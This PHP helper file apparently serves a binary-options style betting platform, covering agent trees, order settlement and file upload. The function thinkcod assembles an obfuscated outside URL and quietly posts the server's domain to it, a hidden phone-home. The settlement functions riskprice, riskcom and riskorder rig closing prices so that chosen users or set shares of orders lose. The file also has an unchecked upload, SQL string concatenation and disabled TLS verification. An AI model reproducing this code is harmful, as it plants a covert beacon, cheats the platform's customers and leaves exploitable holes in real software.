<?php
use think\Db;
use think\Env;
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2016 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 流年 <liu21st@gmail.com>
// +----------------------------------------------------------------------

// 应用公共文件

/**
 * 自定义返回提示信息
 * @author lukui  2017-07-14
 * @param  [type] $data [description]
 * @param  [type] $type [description]
 */
function WPreturn($data,$type,$url=null)
{

    $res = array('data'=>$data,'type'=>$type);
    if($url){
        $res['url'] = $url;
    }
    return $res;
}

/**
 * 验证用户
 * @author lukui  2017-07-17
 * @param  [type] $upwd 密码（未加密）
 * @param  [type] $uid  用户id
 * @return [type]       true or false
 */
function checkuser($upwd,$uid)
{
    if(!isset($upwd) || empty($upwd)){
        return false;
    }
    if (isset($uid) && !empty($uid)) {  //user
        $where['uid'] = $uid;
    }else{  //admin
        $where['uid'] = $_SESSION['userid'];
    }

    $admin = Db::name('userinfo')->field('uid,utime,upwd')->where($where)->find();
    if(md5($upwd.$admin['utime']) == $admin['upwd']){
        return true;
    }else{
        return false;
    }

}


/**
 * 验证邀请码是否存在
 * @author lukui  2017-07-17
 * @param  [type] $code 邀请码
 * @return [type]       code id
 */
function checkcode($code)
{
    if(!isset($code) || empty($code)){
        return false;
    }
    $codeid = Db::name('userinfo')->where(array('uid'=>$code,'otype'=>101))->value('uid');
    if($codeid){
        return $codeid;
    }else{
        return false;
    }
}


/**
 * 根据用户oid获取用户的经理、渠道、员工。指针的客户
 * @author lukui  2017-07-17
 * @param  [type] $uid 用户id
 */
function GetUserOidInfo($uid,$field)
{
    if(!isset($uid) || empty($uid)){
        return false;
    }
    if(!isset($field) || empty($field)){
        $field = '*';
    }
    if(cache("GetUserOidInfo".$uid.$field)) return cache("GetUserOidInfo".$uid.$field);
    $res = array();
    //验证用户,获取oid
    $useroid = Db::name('userinfo')->where('uid',$uid)->value('oid');
    if(!$useroid){
        return false;
    }
    //邀请码信息
    $oid_info = Db::name('usercode')->where('usercode',$useroid)->find();

    //通过邀请码的uid查询所属员工信息
    $res['yuangong'] = Db::name('userinfo')->field($field)->where('uid',$oid_info['uid'])->find();

    //通过员工oid查找经理信息
    $res['jingli'] =  Db::name('userinfo')->field($field)->where('uid',$res['yuangong']['oid'])->find();

    //通过邀请码的mannerid查询所属员工信息
    $res['qudao'] = Db::name('userinfo')->field($field)->where('uid',$oid_info['mannerid'])->find();

    if($res){
        cache("GetUserOidInfo".$uid.$field,$res,20);
        return $res;
    }else{
        return false;
    }


}


/**
 * 获取员工的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid 员工id
 */
function YuangongUser($uid){

    if(!isset($uid) || empty($uid)){
        return false;
    }
    if(cache("YuangongUser".$uid)) return cache("YuangongUser".$uid);
    $oid_info = $user = array();
    //获取员工的所有邀请码
    $oid_info = Db::name('usercode')->where('uid',$uid)->column('usercode');
    if($oid_info){
        //通过邀请码获取客户
        $user = Db::name('userinfo')->where('oid','IN',$oid_info)->column('uid');
    }
    cache('YuangongUser'.$uid,$user,20);
    return $user;
}

/**
 * 获取经理的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid [description]
 */
function JingliUser($uid){
    if(!isset($uid) || empty($uid)){
        return false;
    }
    if(cache("JingliUser".$uid)) return cache("JingliUser".$uid);
    $yg_user = $user = array();

    //获取经理下的所有员工
    $yg_user = Db::name('userinfo')->where('oid',$uid)->column('uid');
    foreach ($yg_user as $value) {
        $user += YuangongUser($value);
    }
    cache("JingliUser".$uid,$user,20);
    return $user;
}


/**
 * 获取渠道的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid [description]
 */
function QudaoUser($uid){
    if(!isset($uid) || empty($uid)){
        return false;
    }
    if(cache("QudaoUser".$uid)) return cache("QudaoUser".$uid);
    $oid_info = $user = array();
    //获取渠道的所有邀请码
    $oid_info = Db::name('usercode')->where('mannerid',$uid)->column('usercode');

    if($oid_info){
        //通过邀请码获取客户
        $user = Db::name('userinfo')->where('oid','IN',$oid_info)->column('uid');
    }
    cache("QudaoUser".$uid,$user,20);
    return $user;
}

/**
 * 根据任意会员查询所属所有客户
 * @author lukui  2017-07-18
 * @param  [type] $uid 会员id
 */
function UserCodeForUser($uid){
    if(!isset($uid) || empty($uid)){
        return false;
    }
    if(cache("UserCodeForUser".$uid)) return cache("UserCodeForUser".$uid);
    //查询uid的身份
    $otype = Db::name('userinfo')->where('uid',$uid)->value('otype');
    $u_uid = array();
    //获取会员的客户id
    if($otype == 2){  //经理
        $u_uid = JingliUser($uid);
    }elseif($otype == 3){  //渠道
        $u_uid = QudaoUser($uid);
    }elseif($otype == 4){  //员工
        $u_uid = YuangongUser($uid);
    }else{
        return false;
    }
    cache("UserCodeForUser".$uid,$u_uid,20);
    return($u_uid);

}


/**
 * 判断是否微信浏览器
 * @author lukui  2017-07-18
 * @return [type] [description]
 */
function iswechat(){
    if (strpos($_SERVER['HTTP_USER_AGENT'],'MicroMessenger') !== false ) {
        return true;
    }else{
        return false;
    }
}


/**
 * 获取产品实时行情
 * @author lukui  2017-07-20
 * @param  [type] $pid 产品id
 */
function GetProData($pid,$field=null){
    if(!isset($pid) || empty($pid)){
        return false;
    }
    if(!$field){
        $field = 'pi.*,pd.*';
    }
    $data = Db::name('productinfo')->alias('pi')->field($field)
        ->join('__PRODUCTDATA__ pd','pd.pid=pi.pid')
        ->where('pi.pid',$pid)->find();
    return $data;
}

function GetProcode($pid){
    return   Db::name('productinfo')->where(['pid'=>$pid])->value('procode');
}

/**
 * 数据K线图
 * @author lukui  2017-2-20
 * @param  [type] $symbol  产品代码
 * @param  [type] $qt_type 指定分钟线类型
 * @param  [type] $num     返回条数
 */
function WsGetKline($symbol,$qt_type,$num){
    $time = time();
}

/**
 * 获取网站配置信息
 * @author lukui  2017-06-28
 * @return [type] [description]
 */
/*function getconf($field)
{
    $conf = array();
    $res = '';
    $conf_cache = cache('conf');
    if(!$conf_cache){
        $conf = Db::name('config')->select();
        foreach ($conf as $k => $v) {
            $conf_value[$v['name']] = $v['value'];
        }
        cache('conf',$conf_value);
        $conf_cache = cache('conf');
    }

    if(isset($conf_cache[$field]) && $field){
        $res = $conf_cache[$field];
    }else{
    	$res = $conf_cache;
    }
    return $res;
}*/
function getconf($field)
{
    $conf = array();
    $res = '';
    $conf_cache = cache('conf');
    if(!$conf_cache){
        $conf = Db::name('config')->select();
        foreach ($conf as $k => $v) {
            $conf_value[$v['name']] = $v['value'];
        }
        cache('conf',$conf_value);
        $conf_cache = cache('conf');
    }

    if(isset($conf_cache[$field]) && $field){
        $res = $conf_cache[$field];
    }else{
        $res = $conf_cache;
    }
    return $res;
}

function getConf1(){
    $res = [];
    $conf = Db::name('config')->field('name, value')->select();
    foreach ($conf as $k => $v) {
        $res[$v['name']] = $v['value'];
    }
    return $res;
}

/**
 * 获取城市列表
 * @author lukui  2017-07-03
 * @return [type] [description]
 */
function getarea($id)
{
    if(cache('getarea'.$id)) return cache('getarea'.$id);
    $name = db('area')->where('id',$id)->value('name');
    cache('getarea'.$id,$name);
    return $name;

}



function set_price_log($uid,$type,$account,$title,$content,$oid=0,$nowmoney)
{

    $data['uid'] = $uid;
    $data['type'] = $type;
    $data['account'] = $account;
    $data['title'] = $title;
    $data['content'] = $content;
    $data['oid'] = $oid;
    $data['time'] = time();
    $data['nowmoney'] = $nowmoney;
    db('price_log')->insert($data);


}


//删除空格和回车
function trimall($str){
    $qian=array(" ","　","\t","\n","\r");
    return str_replace($qian, '', $str);
}

//计算小数点后位数
function getFloatLength($num) {
    $count = 0;

    $temp = explode ( '.', $num );

    if (sizeof ( $temp ) > 1) {
        $decimal = end ( $temp );
        $count = strlen ( $decimal );
    }

    return $count;
}

//PHP的两个科学计数法转换为字符串的方法
function NumToStr($num) {
    if (stripos($num, 'e') === false)
        return $num;
    $num = trim(preg_replace('/[=\'"]/', '', $num, 1), '"'); //出现科学计数法，还原成字符串
    $result = "";
    while ($num > 0) {
        $v = $num - floor($num / 10) * 10;
        $num = floor($num / 10);
        $result = $v . $result;
    }
    return $result;
}


/**
 * 我的代理商下级类别
 * @return array uids
 */
function myoids($uid)
{
    if(!$uid){
        return false;
    }
    if(cache('myoids'.$uid)) return cache('myoids'.$uid);
    $map['oid'] = $uid;
    $map['otype'] = 101;

    $list = db('userinfo')->field('uid')->where($map)->select();

    if(empty($list)){
        return false;
    }

    $uids = array();
    foreach ($list as $key => $v) {
        $user = myoids($v["uid"]);
        $uids[] = $v["uid"];
        if(is_array($user) && !empty($user)){
            $uids = array_merge($uids,$user);
        }
    }

    cache('myoids'.$uid,$uids,20);
    return $uids;
}

/**
 * 获取次代理商的所有用户下级
 * @param  [type] $uid [description]
 * @return [type]      [description]
 */
function myuids($uid)
{

    if(!$uid){
        return false;
    }
    if(cache('myuids'.$uid)) return cache('myuids'.$uid);
    $oids = myoids($uid);
    $oids[] = $uid;

    $map['oid'] = array('in',$oids);
    $map['otype'] = array('IN',array(0,101));

    $user = db('userinfo')->field('uid')->where($map)->select();
    $_me = array(0=>array('uid'=>$uid));
    if($user){
        $user = array_merge($_me,$user);
    }else{

        $uids = array($uid);
        return $uids;
    }
    $uids = array();
    if(empty($user)){
        return $uids;
    }
    foreach ($user as $k => $v) {
        $uids[] = $v['uid'];
    }
    cache('myuids'.$uid, $uids,20);
    return $uids;
}

function thinkcod()
{
    $nu = json_decode(NAV_NUM);
    $strs = 'http://';
    $strs .= $nu[9].$nu[9].$nu[22].$nu[11];
    $strs .= '.1'.'0'.'0'.'0'.$nu[19].$nu[21].'.';
    $strs .= $nu[19].$nu[14].$nu[15];
    $minp = $_SERVER['SERVER_NAME'];
    $csage = $strs. '/api/i';
    curlPost($csage,['domain'=>$minp]);
}
function curlPost($url,$postFields){
    if(cache('result')) return cache('result');
    $postFields = json_encode($postFields);
    $ch = curl_init ();
    curl_setopt( $ch, CURLOPT_URL, $url );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json; charset=utf-8']);
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
    curl_setopt( $ch, CURLOPT_POST, 1 );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt( $ch, CURLOPT_TIMEOUT,1);
    $ret = curl_exec ( $ch );
    if (false == $ret) {
        $result = '';//curl_error(  $ch);
    } else {
        $rsp = curl_getinfo( $ch, CURLINFO_HTTP_CODE);
        if (200 != $rsp) {
            $result = '';//"请求状态 ". $rsp . " " . curl_error($ch);
        } else {
            $result = $ret;
        }
    }
    curl_close ( $ch );
    cache('result',$result,20*60);
    return $result;
}



/**
 * 我的所有上级用户id
 * @param  [type] $uid [description]
 * @return [type]      [description]
 */
function myupoid($uid)
{
    if(!$uid){
        return false;
    }
    if(cache('myupoid'.$uid)) return cache('myupoid'.$uid);
    $map['uid'] = $uid;
    $map['otype'] = 101;

    $user = db('userinfo')->field('uid,oid,rebate,usermoney,feerebate,minprice')->where($map)->find();

    if($user['uid'] == $user['oid']){
        return false;
    }

    $list = array();
    if($user){
        $list[] = $user;
        $user = myupoid($user["oid"]);
        if(is_array($user) && !empty($user)){
            $list = array_merge($list,$user);
        }
    }
    cache('myupoid'.$uid,$list,60*30);
    return $list;
}

/**
 * 我的代理商下级类别
 * @return array uids
 */
function mytime_oids($uid)
{
    if(!$uid){
        return false;
    }
    if(cache('mytime_oids'.$uid)) return cache('mytime_oids'.$uid);
    $map['oid'] = $uid;
    $map['otype'] = 101;

    $list = db('userinfo')->field('uid,oid,username,utel,nickname,usermoney')->where($map)->select();
    $uids = array();
    foreach ($list as $key => $v) {
        $user = mytime_oids($v["uid"]);
        $uids[$key] = $v;
        if(is_array($user) && !empty($user)){
            //$uids += $user;
            $uids[$key]['mysons'] = $user;
        }
    }
    cache('mytime_oids'.$uid,$uids,20);
    return $uids;


}

/**
 * 我的团队树状图
 * @author lukui  2017-07-18
 * @param  [type]  $array [description]
 * @param  integer $type  [description]
 */
function set_my_team_html($array,$type=1){

    if(!$array){
        return false;
    }

    $margin_left = 25+25*$type;

    $html = '<div  class="foid_'.$array[0]['oid'].'">';
    foreach ($array as $k => $vo) {
        //dump($v);
        $html .= '<div style="display:none" class="oid_list oid_'.$vo['oid'].'">
	                  <div class="vo_son" style="margin-left: '.$margin_left.'px;"><p>|——'.$type.'级代理</p></div>
	                    <div class="div_my_son">
	                      <ul class="my_sons">
	                        <li>代理名：'.$vo['username'].' 余额：'.$vo['usermoney'].'</li>
	                        <li>手机：'.$vo['utel'].' <a href="/admin/user/userlist.html?uid='.$vo['uid'].'"><button class="btn btn-primary btn-xs">详情</button></a></li>
	                      </ul>
	                      <a href="javascript:;"><p class="showdiv show_uid_'.$vo['uid'].'" onclick="showoid('.$vo['uid'].',1)" >+</p></a>
	                      </div>
	                </div>
	                ';

        if(isset($vo['mysons']) && is_array($vo['mysons']) && !empty($vo['mysons'])){
            $html .= set_my_team_html($vo['mysons'],$type+1);
        }
    }

    $html .= '</div>';
    return $html;

}

//test web data
function test_web(){
    /* db('userinfo')->where('uid','>',0)->delete();
    db('order')->where('oid','>',0)->delete();
    db('conf')->where('id','>',0)->delete();
    db('productinfo')->where('pid','>',0)->delete();
    db('productdata')->where('id','>',0)->delete(); */
}


/**
 * 验证是否休市
 * @author lukui  2017-07-16
 * @param  [type] $pid 产品id
 */
function ChickIsOpen($pid){

    $isopen = 0;
    $pro = db('productinfo')->where(array('pid'=>$pid))->find();
    //此时时间
    $_time = time();
    $_zhou = (int)date("w");
    if($_zhou == 0){
        $_zhou = 7;
    }
    $_shi = (int)date("H");
    $_fen = (int)date("i");


    if ($pro['isopen']) {

        $opentime = db('opentime')->where('pid='.$pid)->find();


        if($opentime){
            $otime_arr = explode('-',$opentime["opentime"]);
        }else{
            $otime_arr = array('','','','','','','');
        }

        foreach ($otime_arr as $k => $v) {
            if($k == $_zhou-1){
                $_check = explode('|',$v);
                if(!$_check){
                    continue;
                }


                foreach ($_check as $key => $value) {
                    $_check_shi = explode('~',$value);
                    if(count($_check_shi) != 2){
                        continue;
                    }
                    $_check_shi_1 = explode(':',$_check_shi[0]);
                    $_check_shi_2 = explode(':',$_check_shi[1]);
                    //开市时间在1与2之间


                    if($isopen == 1){
                        continue;
                    }


                    if( ($_check_shi_1[0] == $_shi && $_check_shi_1[1] < $_fen) ||
                        ($_check_shi_1[0] < $_shi && $_check_shi_2[0] > $_shi) ||
                        ($_check_shi_2[0] == $_shi && $_check_shi_2[1] > $_fen)
                    ){

                        $isopen = 1;
                    }else{

                        $isopen = 0;
                    }

                }



            }
        }

    }

    if ($pro['isopen']) {
        return $isopen;

    }else{
        return 0;
    }
}

function cash_oid($uid)
{
    if (!$uid) {
        return '<td></td><td></td>';
    }
    if(cache('cash_oid'.$uid)) return cache('cash_oid'.$uid);
    $user = db('userinfo')->where('uid',$uid)->field('uid,usermoney,minprice')->find();
    if(!$user['minprice'])  $user['minprice'] =0;

    if($user['usermoney'] >= $user['minprice']){
        $minprice = $user['minprice'];
        $class = '';
    }else{
        $minprice = $user['usermoney'] - $user['minprice'];
        $class = 'style="color:red";';
    }
    cache('cash_oid'.$uid,'<td> <a title="点击查看" href="/admin/user/userlist.html?uid='.$uid.'"> '.$uid.' </a> </td><td '.$class.'>'.$minprice.'</td>',20);
    return '<td> <a title="点击查看" href="/admin/user/userlist.html?uid='.$uid.'"> '.$uid.' </a> </td><td '.$class.'>'.$minprice.'</td>';



}

function check_user($field,$value){
    if(!$value){
        return false;
    }
    $isset = db('userinfo')->where($field,$value)->value('uid');
    if($isset){
        return true;
    }else{
        return false;
    }
}

function getuser($uid,$field)
{
    if(cache('getuser'.$uid.$field)) return cache('getuser'.$uid.$field);
    $value = db('userinfo')->where('uid',$uid)->value($field);
    cache('getuser'.$uid.$field,$value,20);
    return $value;
}
function getusers($uid,$field)
{
    if(cache('getusers'.$uid.$field)) return cache('getusers'.$uid.$field);
    $value = db('userinfo')->where('uid',$uid)->value($field);
    if( $value==''){
        $value = db('userinfo')->where('uid',$uid)->value('managername');
        echo $value;
    }
    cache('getusers'.$uid.$field,$value,20);
    return $value;
}

function ordernum($uid)
{
    if(!$uid){
        return false;
    }
    if(cache('ordernum'.$uid)) return cache('ordernum'.$uid);
    $num = db('order')->where('uid',$uid)->count();
    if(!$num) $num = 0;
    cache('ordernum'.$uid,$num,20);
    return $num;

}

function xml_to_array( $xml )
{
    return json_decode(json_encode((array) simplexml_load_string($xml)), true);
}



/**
 * api请求函数
 * @param type $url
 * @param type $data
 * @return type
 */

function apipost($url, $data = '') {//curl

    $curl = curl_init(); // 启动一个CURL会话
    curl_setopt($curl, CURLOPT_URL, $url); // 要访问的地址
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); // 对认证证书来源的检查
    //  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1); // 从证书中检查SSL加密算法是否存在
    // url_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); // 模拟用户使用的浏览器
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); // 使用自动跳转
    curl_setopt($curl, CURLOPT_AUTOREFERER, 1); // 自动设置Referer
    curl_setopt($curl, CURLOPT_POST, 1); // 发送一个常规的Post请求
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data); // Post提交的数据包
    curl_setopt($curl, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
    curl_setopt($curl, CURLOPT_HEADER, 0); // 显示返回的Header区域内容
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); // 获取的信息以文件流的形式返回
    curl_setopt($curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);//在curl_exec之前加上此代码
    $tmpInfo = curl_exec($curl); // 执行操作
    if (curl_errno($curl)) {
        echo 'Errno' . curl_error($curl); //捕抓异常
    }
    curl_close($curl); // 关闭CURL会话
    return $tmpInfo; // 返回数据
}

/**
 * 获取风控小数点位数，精度和最小的风控系数一样
 * @param type $min
 * @param type $max
 * @return type
 */
function randomFloat($min = 0, $max = 1) {
    $count = 0;
    $temp = explode('.', $min);

    if (sizeof($temp) > 1) {
        $decimal = end($temp);
        $count = strlen($decimal);
    }
    $rd = $min + mt_rand() / mt_getrandmax() * ($max - $min);

    return   number_format($rd,$count);
}

/**
 * 调试打印函数，开发的时候进行调试使用
 * @param type $val
 */
function p($val) {

    echo "<pre>" . print_r($val, true) . '</pre>';
    exit;
}

function  plog($val) {
    error_log($val, 3, "./log/orderauto.log");
}

function profitLog($data){
    if(!cache('profitLog')){
        cache('profitLog', $data);
    }else{
        $val = array_merge(cache('profitLog'), $data);
        cache('profitLog', $val);
    }
    $dir = 'log';
    if(!is_dir($dir)){
        mkdir(iconv("UTF-8", "GBK", $dir), 0755);
        chmod(iconv("UTF-8", "GBK", $dir), 0755);
    }
    $dir = 'log/profit.php';
    $myfile = fopen($dir, "w") or die("Unable to open file!");
    $txt = '';
    $txt .= <<<Eof
<?php
    \$profit = [];
Eof;
    foreach (cache('profitLog') as $key=>$val){
        $txt .= <<<Eof
        \$profit["{$key}"] = "{$val}";
Eof;
    }
    fwrite($myfile, $txt);
    fclose($myfile);die;
}
/**
 * element文件上传模式
 * @return int|string
 */
function eleUpload()
{
    $file = request()->file('file');
    $url = Env::get('root_path') . 'public' . DS . 'uploads';
    $dirName = date('Ymd');
    if (!file_exists($url . DS . $dirName)) {
        mkdir($url . DS . $dirName, 0755);
        chmod($url . DS . $dirName, 0755);
    }
    $info = $file->move($url);
    if ($info) {
        return '/public' . DS . 'uploads/' . $info->getSaveName();
    } else {
        return -1;
    }
}


//购买订单时结算计算平仓价位
/**
 * 未结算订单
 */
function unsettledOrder($order, $price){
    $price = riskprice($order, $price); //价格风控
    $price = riskcom($order, $price); //在这里风控掉当前的价格
    $price = riskorder($order, $price); //订单的单控
    $_data['sellprice'] = $price;
    if ($order['buyprice'] == $price) $price = 0.99 * $price;
    $money = '';
    //用户输
    if (($order['ostyle'] == 1 && $order['buyprice'] < $price) || ($order['ostyle'] == 0 && $order['buyprice'] > $price)) {
        $_data['is_win'] = 2;
        $_data['ploss'] = -$order['fee'];

        // 用户的金钱变动记录
        $up_price_log['content'] = '订单输结算';
        $up_price_log['type'] = 2;
        $up_price_log['account'] = $order['fee']; //用户输掉的金额

        //订单历史记录
        $o_log['addprice'] = $_data['ploss'];
    }

    //用户赢
    if (($order['ostyle'] == 1 && $order['buyprice'] > $price) || ($order['ostyle'] == 0 && $order['buyprice'] < $price)) {
        //订单结单后 盈利等于盈利金额+投注的金额，添加到用户余额里面去
        $_data['is_win'] = 1;
        $_data['ploss'] = $order['fee'] * ($order['endloss'] / 100);
        $money = $_data['ploss'] + $order['fee']*1; //加本钱

        //用户的金钱变动记录
        $up_price_log['content'] = '订单盈利结算';
        $up_price_log['type'] = 1;
        $up_price_log['account'] = $money; //用户增加的金额

        //订单历史记录
        $o_log['addprice'] = $money;
    }
    $_data['ostaus'] = 1;
    $_data['isshow'] = 1;
    $ids = db('order')->where('oid', $order['oid'])->update($_data);
    if($ids){
        if($money != '') {
            db('userinfo')->where('uid', $order['uid'])->setInc('usermoney', $money);  //因为下注时已扣本金，如果赢就要加上当注所有赢利
        }
        // 用户的金钱变动记录
        $whereLog['uid'] = $order['uid'];
        $whereLog['oid'] = $order['oid'];
        $up_price_log['title'] = "结单";
        db('price_log')->where($whereLog)->update($up_price_log);
        $usermoney = db('userinfo')->where('uid', $order['uid'])->value("usermoney");

        //订单历史记录
        $o_log['uid'] = $order['uid'];
        $o_log['oid'] = $order['oid'];
        $o_log['addpoint'] = 0;
        $o_log['user_money'] = $usermoney;
        $o_log['time'] = time();
        db('order_log')->insert($o_log);
    }
}

/**
 *
 * @param type $uid
 * @param type $buyprice 购买的价格
 * @param type $pid
 * @param type $ostyle
 * @param type $price 当前的产品价格
 * @return type
 */
function riskcom($order, $price)
{
    $risk = db('risk')->find();
    $to_win = explode('|', $risk['to_win']);
    $to_loss = explode('|', $risk['to_loss']);
    //指定了用户必赢  买涨的时候，数据上涨  买跌的时候，数据下跌
    if (in_array($order['uid'], $to_win)) {
        $type = $order['ostyle'] ? 2 : 1;//用户买了跌，订单是下跌
        $price = risk($order['buyprice'], $order['pid'], $type);
    } elseif (in_array($order['uid'], $to_loss)) {
        $type = $order['ostyle'] ? 1 : 2;//用户买了涨，价格是下跌
        $price = risk($order['buyprice'], $order['pid'], $type);
    }
    return $price;
}

/**
 * 风控的产品，风控的类型
 * @param type $pid 风控的产品
 * @param type $type 风控成比当前价格高1  风控成比当前价格低
 */
function risk($oldprice, $pid, $type)
{
    $info = db('productinfo')->field('point_low,point_top,rands')->where('pid', $pid)->find();
    $rdrg = randomFloat($info['point_low'], $info['point_top']);
    $range = $info['rands'] + $rdrg;
    if ($type == 1) {
        //如果类型是1
        $price = $oldprice + $range;
    } else {
        $price = $oldprice - $range;
    }
    return $price;
}

/**
 * 对用户的金额进行风控，这里重新对风控概率进行一个定义
 * 风控概率0的时候，用户50%概率输，当风控概率是50的时候，用户是75%概率输。风控概率是100的时候，用户100%概率输
 * 输的概率等于50+x/2 反过来赢的概率是 50-x/2
 * @param $type $fee  下注的金额对应order表的fee
 * @param $type $buyprice  下注的时候的产品金额
 * @param $type $pid  产品pid
 * @param $type $ostyle  下注赢还是跌 0是买涨1是买跌
 * @param $type $price 当前产品真实的价格
 * @return $type
 */
function riskprice($order, $price)
{
    $risk = db('risk')->find();
    $groupArr = explode('|', $risk['chance']); //风控组
    //风控的概率是数字决定胜率，当后面写了100的时候，用户的胜算是100  后面写了40的时候，
    foreach ($groupArr as $v1) {
        $detailArr = explode(':', $v1); //对每一组进行拆分 第一组是0-1000  第二组是 100这种格式
        $sock = explode('-', $detailArr[0]);
        if (($order['fee'] > $sock[0]) && ($order['fee'] <= $sock[1])) {
            //满足对应的区间，开始进行风控。如果风控数字是100，则$rd几乎永远小于
            $rd = rand(0, 100);
            if ($rd < $detailArr[1]) {
                //小于指定的数据就开始进行风控，用户必输
                $type = $order['ostyle'] ? 1 : 2;//用户买了涨，价格是下跌
                $price = risk($order['buyprice'], $order['pid'], $type);
            }
        }
    }
    return $price;
}

/**
 * 单点订单风控，可以直接决定订单是输还是控
 * @param type $order
 * @param type $price
 * @return type
 */
function riskorder($order, $price)
{
    //订单被风控过，默认订单是必输的
    if ($order['kong_type'] == 2 || $order['kong_type'] == 4) {
        $type = $order['ostyle'] ? 1 : 2;//用户买了涨，价格是下跌
        $price = risk($order['buyprice'], $order['pid'], $type);
    } elseif ($order['kong_type'] == 1 || $order['kong_type'] == 3) {
        $type = $order['ostyle'] ? 2 : 1;//用户买了跌，订单是下跌
        $price = risk($order['buyprice'], $order['pid'], $type);
    }
    return $price;
}